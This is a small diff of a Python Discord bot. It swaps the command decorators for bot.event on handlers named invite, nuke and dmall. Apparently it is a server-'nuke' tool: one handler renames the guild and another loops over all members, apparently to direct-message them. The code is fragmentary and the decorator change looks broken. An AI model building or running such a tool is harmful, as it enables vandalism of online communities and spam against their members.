@@ -18,11 +18,11 @@ async def on_ready():
 async def ping(ctx):
     await ctx.send(f'Pong! {round(client.latency * 1000)}ms')
 
-@client.command
+@bot.event
 async def invite(ctx):
   await ctx.reply('')
 
-@client.command(pass_context=True)
+@bot.event
 async def nuke(ctx):
 
     await ctx.guild.edit(name='SERVER NAME') #Decide what to change the server name to
@@ -43,7 +43,7 @@ async def nuke(ctx):
      
  
  
-@client.command()
+@bot.event
 async def dmall(ctx, *,args=None):
      if args != None:
        members = ctx.guild.members
